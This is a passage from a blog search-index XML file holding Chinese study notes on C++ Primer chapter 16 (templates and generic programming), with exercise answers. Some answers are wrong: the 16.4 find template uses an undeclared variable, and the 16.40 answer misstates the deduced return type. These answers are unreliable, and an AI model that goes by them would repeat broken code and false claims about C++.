<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第16章 模板和泛型编程</title>
      <link href="/2024/01/02/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch16-%E6%A8%A1%E6%9D%BF%E5%92%8C%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B/"/>
      <url>/2024/01/02/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch16-%E6%A8%A1%E6%9D%BF%E5%92%8C%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>面向对象编程和泛型编程都能处理在编写程序时不知道类型的情况。</p><ul><li>OOP能处理类型在程序运行之前都未知的情况；</li><li>泛型编程中，在编译时就可以获知类型。</li></ul><h2 id="定义模板">定义模板</h2><ul><li><strong>模板</strong>：模板是泛型编程的基础。一个模板就是一个创建类或函数的蓝图或者说公式。</li></ul><h3 id="函数模板">函数模板</h3><ul><li><p><code>template &lt;typename T&gt; int compare(const T &amp;v1, const T &amp;v2) &#123;&#125;</code></p></li><li><p>模板定义以关键字 <code>template</code>开始，后接<strong>模板形参表</strong>，模板形参表是用<strong>尖括号</strong><code>&lt;&gt;</code>括住的一个或多个<strong>模板形参</strong>的列表，用逗号分隔，<strong>不能为空</strong>。</p></li><li><p>使用模板时，我们显式或隐式地指定模板实参，将其绑定到模板参数上。</p></li><li><p>模板类型参数：类型参数前必须使用关键字<code>class</code>或者<code>typename</code>，这两个关键字含义相同，可以互换使用。旧的程序只能使用<code>class</code>。<br>注意每个参数前都要加<code>class</code>或<code>typename</code>，比如这样是错误的：<code>template &lt;typename T, U&gt; T calc(const T&amp;, const U&amp;);</code> U之前必须加上<code>typename</code>。</p></li><li><p><strong>非类型模板参数：表示一个值而非一个类型。其模板实参必须是常量表达式</strong>。<code>template &lt;class T, size_t N&gt; void array_init(T (&amp;parm)[N])&#123;&#125;</code>。</p></li><li><p>绑定到非类型整型的实参必须是一个常量表达式。<br>绑定到指针或引用非类型参数的实参必须具有静态的生存期，不能用一个普通（非<code>static</code>）局部变量或动态对象作为指针或引用非类型模板参数的实参。</p></li><li><p><strong>内联函数模板中<code>inline</code>或<code>constexpr</code>说明符放在模板参数列表之后，返回类型之前</strong>： <code>template &lt;typename T&gt; inline T min(const T&amp;, const T&amp;);</code></p></li><li><p>模板程序应该尽量减少对实参类型的要求，比如：</p><ul><li>函数参数是**<code>const</code>的引用**，这样就能用于不能拷贝的类型；</li><li>函数体中的条件判断仅使用<code>&lt;</code>比较运算或<code>less</code>，这样类型就不必同时支持<code>&gt;</code>。</li></ul></li><li><p><strong>函数模板和类模板成员函数的定义通常放在头文件中，即模板的头文件通常既包括声明也包括定义。</strong></p></li></ul><blockquote><p>关键概念：模板和头文件</p><ul><li>当使用模板时，模板的提供者必须保证所有<strong>不依赖于模板参数的名字</strong>必须是可见的，即需要保证模板的定义包括类模板的成员的定义必须是可见的。</li><li>模板的用户需要保证，用来实例化模板的所有函数、类型以及与类型关联的运算符的声明都必须是可见的。</li></ul><p>模板的设计者应该提供一个<strong>头文件，包含模板定义</strong>以及在类模板或成员定义中用到的所有名字的声明；模板的用户必须包含模板的头文件。</p></blockquote><p><strong>大多数编译错误在实例化期间报告</strong></p><ol><li>编译模板本身时，编译器只能检查语法错误，比如忘记分号或变量名拼写；</li><li>模板使用时，仍然没有很多可检查的。<br>对于函数模板调用，编译器通常会检查实参数目和类型是否匹配；而对于类模板，编译器只会检查模板实参的数目。</li><li>模板实例化时，只有这个阶段才会发现类型相关的错误。依赖于编译器如何管理实例化，这类错误<strong>可能在链接时才报告</strong>。<br>比如当编译器处理<code>compare</code>函数模板是，不能验证实参是否真的定义了<code>&lt;</code>运算符，这类错误直到实例化时才会被发现。</li></ol><h4 id="练习16-1">练习16.1</h4><p>Q：给出实例化的定义。</p><p>A：当调用一个函数模板时，编译器会利用给定的函数实参来推断模板实参，用此实际实参代替模板参数来创建出模板的一个新的“实例”， 也就是一个真正可以调用的函数，这个过程称为<strong>实例化</strong>。</p><h4 id="练习16-4">练习16.4</h4><p>Q：编写行为类似标准库 <code>find</code> 算法的模版。函数需要两个模版类型参数，一个表示函数的迭代器参数，另一个表示值的类型。使用你的函数在一个 <code>vector&lt;int&gt;</code> 和一个<code>list&lt;string&gt;</code>中查找给定值。</p><p>A：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Iterator, <span class="keyword">typename</span> Value&gt;</span></span><br><span class="line"><span class="function">Iterator <span class="title">find</span><span class="params">(Iterator first, Iterator last, <span class="type">const</span> Value&amp; v)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> ( ; first != last &amp;&amp; *first != value; ++first);</span><br><span class="line"><span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="练习16-5">练习16.5</h4><p>Q：为6.2.4节中的<code>print</code>函数编写模版版本，它接受一个数组的引用，能处理任意大小、任意元素类型的数组。</p><p>A：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Array&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">const</span> Array&amp; arr)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; elem : arr)</span><br><span class="line">std::cout &lt;&lt; elem &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="练习16-6">练习16.6</h4><p>Q：你认为接受一个数组实参的标准库函数 <code>begin</code> 和 <code>end</code> 是如何工作的？定义你自己版本的 <code>begin</code> 和 <code>end</code>。</p><p>A：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="type">unsigned</span> N&gt;</span></span><br><span class="line"><span class="function">T* <span class="title">begin</span><span class="params">(<span class="type">const</span> T (&amp;arr)[N])</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="type">unsigned</span> N&gt;</span></span><br><span class="line"><span class="function">T* <span class="title">end</span><span class="params">(<span class="type">const</span> T (&amp;arr)[N])</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr + N;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类模板">类模板</h3><ul><li><p>类模板用于生成类的蓝图。</p></li><li><p>不同于函数模板，<strong>编译器不能推断模板参数类型</strong>。</p></li><li><p><strong>定义类模板</strong>：</p><ul><li><code>template &lt;class Type&gt; class Queue &#123;&#125;;</code></li></ul></li><li><p>实例化类模板：提供显式模板实参列表，来实例化出特定的类。</p></li><li><p>一个类模板中所有的实例都形成一个独立的类。</p></li><li><p><strong>模板形参作用域</strong>：模板形参的名字可以在声明为模板形参之后直到模板声明或定义的末尾处使用。<br>当使用一个类模板类型时必须提供模板参数，但是有一个例外：在类模板自己的作用域中，可以只使用模板名而不提供实参。</p></li><li><p>类模板的成员函数：</p><ul><li><code>template &lt;typename T&gt; ret-type Blob&lt;T&gt;::member-name(parm-list)</code></li></ul></li><li><p><strong>默认情况下，对于一个实例化了的类模板，其成员只有在使用时才被实例化。</strong></p></li><li><p>类与友元各自是否是模板是无关的，可以建立一对一友好关系，也可以建立通用和特定的模板友好关系。</p></li><li><p>新标准允许模板将自己的类型参数成为友元。<code>template &lt;typename T&gt; class Bar&#123;friend T;&#125;;</code>。</p></li><li><p>模板类型别名：因为模板不是一个类型，因此无法定义一个<code>typedef</code>引用一个模板，但是新标准允许我们为类模板定义一个类型别名：<code>template&lt;typename T&gt; using twin = pair&lt;T, T&gt;;</code>使用：<code>twin&lt;string&gt; parents;</code>。</p></li><li><p>类模版的static成员:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> std::<span class="type">size_t</span> <span class="title">cout</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> ctr; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">static</span> std::<span class="type">size_t</span> ctr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>对任意给定类型<code>X</code>，都有一个<code>Foo&lt;X&gt;::ctr</code>和一个<code>Foo&lt;X&gt;::cout</code>成员。</strong><br>所有<code>Foo&lt;X&gt;</code>类型的对象共享相同的<code>ctr</code>对象和<code>count</code>函数。</p></li><li><p>类似任何其他成员函数，<strong>一个<code>static</code>成员函数只有在使用时才会实例化</strong>。</p></li></ul><h3 id="模板参数">模板参数</h3><ul><li><p>与其他任何名字一样，模板参数会隐藏外层作用域中生声明的相同名字。<br>但是，与大多数其他上下文不同，在模板内不能重用模板参数名。</p></li><li><p>一个特定文件所需要的所有模板的声明通常一起放置在文件开始位置。</p></li><li><p>对于<code>T::mem</code>这样的代码</p><ul><li>在非模板代码中，编译器掌握类的定义，它通过作用域运算符知道访问的名字是类型还是<code>static</code>成员。</li><li>但在模板代码中，编译器不知道<code>mem</code>是一个类型成员还是一个<code>static</code>数据成员。<ul><li><strong>默认情况下，假定访问的是名字，而非类型。</strong></li><li>因此，<strong>如果希望使用一个模板类型参数的类型成员，就必须显示告诉编译器该名字是一个类型，需要通过关键字<code>typename</code>来说明这一点</strong>： <code>return typename T::value_type();</code>。</li></ul></li></ul></li><li><p>当我们希望通知编译器一个名字表示类型时，必须使用关键字<code>typename</code>，而不能使用<code>class</code>。</p></li><li><p>默认模板实参：<code>template &lt;class T = int&gt; class Numbers&#123;&#125;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> F = less&lt;T&gt;&gt;</span><br><span class="line"><span class="type">int</span> <span class="built_in">compare</span>(<span class="type">const</span> T &amp;v1, <span class="type">const</span> T &amp;v2, F f = <span class="built_in">F</span>()) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">f</span>(v1, v2)) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">f</span>(v2, v1)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p><mark>TODO:</mark> <code>F f = F()</code> 用法看不懂</p></blockquote><h4 id="练习16-17">练习16.17</h4><p>Q: 声明为 <code>typename</code> 的类型参数和声明为 <code>class</code> 的类型参数有什么不同（如果有的话）？什么时候必须使用<code>typename</code>？</p><p>A: 没有什么不同。默认情况下，C++假定通过作用域运算符访问的名字是static数据成员，当我们希望通知编译器一个名字表示类型时，必须使用关键字 <code>typename</code>，而不能使用 <code>class</code>。</p><h4 id="练习16-18">练习16.18</h4><p>Q：解释下面每个函数模版声明并指出它们是否非法。更正你发现的每个错误。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(a) <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, U, <span class="keyword">typename</span> V&gt; <span class="function"><span class="type">void</span> <span class="title">f1</span><span class="params">(T, U, V)</span></span>;</span><br><span class="line">(c) <span class="keyword">inline</span> <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function">T <span class="title">foo</span><span class="params">(T, <span class="type">unsigned</span> <span class="type">int</span> *)</span></span>;</span><br><span class="line">(d) <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="built_in">f4</span>(T, T);</span><br><span class="line">(e) <span class="keyword">typedef</span> <span class="type">char</span> Ctype;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Ctype&gt; <span class="function">Ctype <span class="title">f5</span><span class="params">(Ctype a)</span></span>;</span><br></pre></td></tr></table></figure><p>A:</p><ul><li>(a) 非法。应该为 <code>template &lt;typename T, typename U, typename V&gt; void f1(T, U, V);</code>。</li><li>© 非法。应该为 <code>template &lt;typename T&gt; inline T foo(T, unsigned int*);</code></li><li>(d) 非法。应该为 <code>template &lt;typename T&gt; T f4(T, T);</code></li><li>(e) 合法。但<code>Ctype</code> 被隐藏了。</li></ul><h4 id="练习-16-19">练习 16.19</h4><p>Q：编写函数，接受一个容器的引用，打印容器中的元素。使用容器的 <code>size_type</code> 和 <code>size</code>  成员来控制打印元素的循环。</p><p>A：注意：<strong>默认情况下，C++假定通过作用域运算符访问的名字是static数据成员，当我们希望通知编译器一个名字表示类型时，必须使用关键字 <code>typename</code>。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Container&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">const</span> Container&amp; c)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">typename</span> Container::size_type i = <span class="number">0</span>; i != c.<span class="built_in">size</span>(); ++i)</span><br><span class="line">std::cout &lt;&lt; c[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="成员模板">成员模板</h3><ul><li>成员模板（member template）：本身是模板的函数成员，成员模板不能是虚函数。<ul><li><p>普通（非模板）类的成员模板。eg. <code>unique_ptr&lt;int, DebugDelete&gt; p(new int, DebugDelete()</code> 其中 <code>DebugDelete()</code> 是一个临时对象作为删除器，调用<code>DebugDelete</code> 对象会<code>delete</code>其给定的指针：<code>DebugDelete()(ip);</code></p></li><li><p><strong>类模板的成员模板，必须同时为类模板和成员模板提供模板参数列表。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> It&gt;</span><br><span class="line">Blob&lt;T&gt;::<span class="built_in">Blob</span>(It b, It  e):</span><br><span class="line">    <span class="built_in">data</span>(std::make_shared&lt;std::vector&lt;T&gt;&gt;(b, e)) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化Blob&lt;string&gt;及其接收两个list&lt;const char*&gt;::iterator</span></span><br><span class="line">list&lt;<span class="type">const</span> <span class="type">char</span>*&gt; w = &#123;<span class="string">&quot;now&quot;</span>, <span class="string">&quot;is&quot;</span>, <span class="string">&quot;the&quot;</span>&#125;;</span><br><span class="line"><span class="function">Blob&lt;string&gt; <span class="title">a3</span><span class="params">(w.begin(), w.end())</span></span>;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="控制实例化">控制实例化</h3><ul><li>动机：在多个文件中实例化相同模板的额外开销可能非常严重。</li><li>显式实例化：<ul><li><code>extern template declaration;  // 实例化声明</code> 此声明必须出现在任何使用此实例化版本的代码之前</li><li><code>template declaration;  // 实例化定义</code></li></ul></li></ul><h3 id="效率与灵活性">效率与灵活性</h3><p><strong>在运行时绑定删除器</strong></p><ul><li>很容易地重载一个<code>shared_ptr</code>删除器，只要在创建或<code>reset</code>指针时传递给它一个可调用对象即可，即删除器必须保存为一个指针或一个封装了指针的类。</li><li>可以确定<code>shared_ptr</code>不是将删除器直接保存为一个成员，因为删除器的类型直到运行时才会知道，而<code>shared_ptr</code>的生存期中可以随时改变删除器的类型，类成员的类型在运行时是不能改变的。因此，不能直接保存删除器。</li></ul><p><strong>在编译时绑定删除器</strong></p><ul><li>删除器的类型是一个<code>unique_ptr</code>对象类型的一部分，用户必须在定义<code>unique_ptr</code>时以显式模板实参的形式提供删除器的类型。</li><li>删除器可以直接保存在<code>unique_ptr</code>对象中，删除器在编译时绑定，无运行时额外开销。</li></ul><h4 id="练习16-28">练习16.28</h4><p>Q: 编写你自己版本的 <code>shared_ptr</code> 和 <code>unique_ptr</code>。</p><p>A: <mark>TODO</mark></p><h4 id="练习16-31">练习16.31</h4><p>Q: 如果我们将 <code>DebugDelete</code> 与 <code>unique_ptr</code> 一起使用，解释编译器将删除器处理为内联形式的可能方式。</p><p>A: <code>shared_ptr</code> 是运行时绑定删除器，<code>unique_ptr</code> 则是编译时绑定删除器。<code>unique_ptr</code> 有两个模板参数，一个是所管理的对象类型，另一个是删除器类型。因此，删除器类型是 <code>unique_ptr</code> 类型的一部分，在编译时就可知道，删除器可直接保存在 <code>unique_ptr</code> 对象中。通过这种方式，<code>unique_ptr</code> 避免了间接调用删除器的运行时开销，而编译时还可以将自定义的删除器，如 <code>DebugDelete</code> 编译为内联形式。</p><h2 id="模板实参推断">模板实参推断</h2><ul><li>对函数模板，编译器利用调用中的函数实参来确定其模板参数，这个过程叫<strong>模板实参推断</strong>。</li></ul><h3 id="类型转换与模板类型参数">类型转换与模板类型参数</h3><ul><li>能够自动转换类型的只有：<ul><li><strong>和其他函数一样，顶层<code>const</code>会被忽略。</strong><br>顶层 const 无论出现在形参还是实参中都会被忽略。</li><li><strong>数组实参或函数实参转换为指针。</strong></li></ul></li><li>其他类型，如算术转换、派生类向基类的转换以及用户自定义的转换都不能用于函数模板。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function">T <span class="title">fobj</span><span class="params">(T, T)</span></span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function">T <span class="title">fref</span><span class="params">(<span class="type">const</span> T&amp;, <span class="type">const</span> T&amp;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>], b[<span class="number">43</span>];</span><br><span class="line"><span class="built_in">fobj</span>(a, b);  <span class="comment">// 调用f(int*, int*)</span></span><br><span class="line"><span class="built_in">fref</span>(a, b);  <span class="comment">// 错误：数组类型不匹配</span></span><br></pre></td></tr></table></figure><ul><li>两个数组大小不同，因此是不同类型。<ul><li><code>fobj</code> 调用中，数组大小不同无关紧要，数组都被转换为指针。</li><li><code>fref</code> 调用不合法，如果形参是一个引用，则数组不会转换为指针。</li></ul></li></ul><h3 id="函数模板显式实参">函数模板显式实参</h3><ul><li>某些情况下，编译器无法推断出模板实参的类型。</li><li>定义：<code>template &lt;typename T1, typename T2, typename T3&gt; T1 sum(T2, T3);</code></li><li><strong>使用函数显式实参调用</strong>：<code>auto val3 = sum&lt;long long&gt;(i, lng); // T1是显式指定，T2和T3都是从函数实参类型推断而来</code></li><li><strong>注意</strong>：正常类型转换可以应用于显式指定的实参。</li></ul><h4 id="练习16-37">练习16.37</h4><p>Q：标准库 <code>max</code> 函数有两个参数，它返回实参中的较大者。此函数有一个模版类型参数。你<strong>能在调用 <code>max</code> 时传递给它一个 <code>int</code> 和一个 <code>double</code> 吗</strong>？如果可以，如何做？如果不可以，为什么？</p><p>A：<strong>可以。提供显式的模版实参即可：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">double</span> b = <span class="number">2</span>;</span><br><span class="line">std::<span class="built_in">max</span>&lt;<span class="type">double</span>&gt;(a, b);</span><br></pre></td></tr></table></figure><h4 id="练习16-38">练习16.38</h4><p><strong>Q：当我们调用 <code>make_shared</code> 时，必须提供一个显示模版实参。解释为什么需要显式模版实参以及它是如果使用的。</strong></p><p><strong>A：如果不显示提供模版实参，那么 <code>make_shared</code> 无法推断要分配多大内存空间。</strong></p><h4 id="练习16-39">练习16.39</h4><p>Q：对16.1.1节 中的原始版本的 <code>compare</code> 函数，使用一个显式模版实参，使得可以向函数传递两个字符串字面量。</p><p>A：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">compare</span>&lt;std::string&gt;(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="尾置返回类型与类型转换">尾置返回类型与类型转换</h3><ul><li>使用场景：并不清楚返回结果的准确类型，但知道所需类型是和参数相关的。</li><li><code>template &lt;typename It&gt; auto fcn(It beg, It end) -&gt; decltype(*beg)</code><br><strong>解引用运算符返回一个左值，因此通过 <code>decltype</code> 推断的类型为 <code>beg</code> 表示的元素的类型的引用。</strong></li><li><strong>尾置返回允许我们在参数列表之后声明返回类型。</strong></li></ul><p>标准库的<strong>类型转换</strong>模板：</p><ul><li>定义在头文件<code>type_traits</code>中。</li><li>必须再返回类型的声明中<strong>使用 <code>typename</code> 来告知编译器，<code>type</code> 表示一个类型</strong>。</li></ul><table><thead><tr><th>对<code>Mod&lt;T&gt;</code>，其中<code>Mod</code>是：</th><th>若<code>T</code>是：</th><th>则<code>Mod&lt;T&gt;::type</code>是：</th></tr></thead><tbody><tr><td><code>remove_reference</code></td><td><code>X&amp;</code>或<code>X&amp;&amp;</code></td><td><code>X</code></td></tr><tr><td></td><td>否则</td><td><code>T</code></td></tr><tr><td><code>add_const</code></td><td><code>X&amp;</code>或<code>const X</code>或函数</td><td><code>T</code></td></tr><tr><td></td><td>否则</td><td><code>const T</code></td></tr><tr><td><code>add_lvalue_reference</code></td><td><code>X&amp;</code></td><td><code>T</code></td></tr><tr><td></td><td><code>X&amp;&amp;</code></td><td><code>X&amp;</code></td></tr><tr><td></td><td>否则</td><td><code>T&amp;</code></td></tr><tr><td><code>add_rvalue_reference</code></td><td><code>X&amp;</code>或<code>X&amp;&amp;</code></td><td><code>T</code></td></tr><tr><td></td><td>否则</td><td><code>T&amp;&amp;</code></td></tr><tr><td><code>remove_pointer</code></td><td><code>X*</code></td><td><code>X</code></td></tr><tr><td></td><td>否则</td><td><code>T</code></td></tr><tr><td><code>add_pointer</code></td><td><code>X&amp;</code>或<code>X&amp;&amp;</code></td><td><code>X*</code></td></tr><tr><td></td><td>否则</td><td><code>T*</code></td></tr><tr><td><code>make_signed</code></td><td><code>unsigned X</code></td><td><code>X</code></td></tr><tr><td></td><td>否则</td><td><code>T</code></td></tr><tr><td><code>make_unsigned</code></td><td>带符号类型</td><td><code>unsigned X</code></td></tr><tr><td></td><td>否则</td><td><code>T</code></td></tr><tr><td><code>remove_extent</code></td><td><code>X[n]</code></td><td><code>X</code></td></tr><tr><td></td><td>否则</td><td><code>T</code></td></tr><tr><td><code>remove_all_extents</code></td><td><code>X[n1][n2]...</code></td><td><code>X</code></td></tr><tr><td></td><td>否则</td><td><code>T</code></td></tr></tbody></table><h4 id="练习16-40">练习16.40</h4><p>Q：下面的函数是否合法？如果不合法，为什么？如果合法，对可以传递的实参类型有什么限制（如果有的话）？返回类型是什么？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> It&gt;</span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">fcn3</span><span class="params">(It beg, It end)</span> -&gt; <span class="title">decltype</span><span class="params">(*beg + <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//处理序列</span></span><br><span class="line">  <span class="keyword">return</span> *beg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>A：合法，但存在两个问题：</p><ol><li>序列元素类型必须支持<code>+</code>运算符;</li><li><strong><code>*beg + 0</code> 是右值，因此<code>fcn3</code>的返回类型被推断为元素类型的常量引用。</strong></li></ol><h4 id="练习16-41">练习16.41</h4><p>Q：编写一个新的<code>sum</code>版本，它的返回类型保证足够大，足以容纳加法结果。</p><p>A：注意：<code>1.1</code>的类型为<code>double</code>，<code>1.1f</code>的类型为<code>float</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2&gt;</span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">sum</span><span class="params">(T1 lhs, T2 rhs)</span> -&gt; <span class="title">decltype</span><span class="params">(lhs + rhs)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> lhs + rhs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> a = <span class="built_in">sum</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  cout &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(a) &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">auto</span> b = <span class="built_in">sum</span>(<span class="number">1</span>, <span class="number">1.1</span>);</span><br><span class="line">  cout &lt;&lt; b &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(b) &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">auto</span> c = <span class="built_in">sum</span>(<span class="number">1</span>, <span class="number">1.1f</span>);</span><br><span class="line">  cout &lt;&lt; c &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(c) &lt;&lt; endl;</span><br><span class="line">  std::cout &lt;&lt; INT_MAX + INT_MAX &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">2.1</span> <span class="number">8</span></span><br><span class="line"><span class="number">2.1</span> <span class="number">4</span></span><br><span class="line"><span class="number">-2</span></span><br></pre></td></tr></table></figure><h3 id="函数指针和实参推断">函数指针和实参推断</h3><ul><li>当使用一个函数模板初始化一个函数指针或为一个函数指针赋值时，编译器使用指针的类型来推断模板实参。</li></ul><h3 id="模板实参推断和引用">模板实参推断和引用</h3><ul><li>从左值引用函数推断类型：若形如<code>T&amp;</code>，则只能传递给它一个左值。但如果是<code>const T&amp;</code>，则可以接受一个右值。</li><li>从右值引用函数推断类型：若形如<code>T&amp;&amp;</code>，则只能传递给它一个右值。</li><li>引用折叠和右值引用参数：<ul><li>规则1：<strong>当我们将一个左值传递给函数的右值引用参数，且右值引用指向模板类型参数时（如<code>T&amp;&amp;</code>），编译器会推断模板类型参数为实参的左值引用类型。</strong></li><li>规则2：<strong>如果我们间接创造一个引用的引用，则这些引用形成了折叠。折叠引用只能应用在间接创造的引用的引用，如类型别名或模板参数。对于一个给定类型<code>X</code>：</strong><ul><li><code>X&amp; &amp;</code>、<code>X&amp; &amp;&amp;</code>和<code>X&amp;&amp; &amp;</code>都折叠成类型<code>X&amp;</code>。</li><li>类型<code>X&amp;&amp; 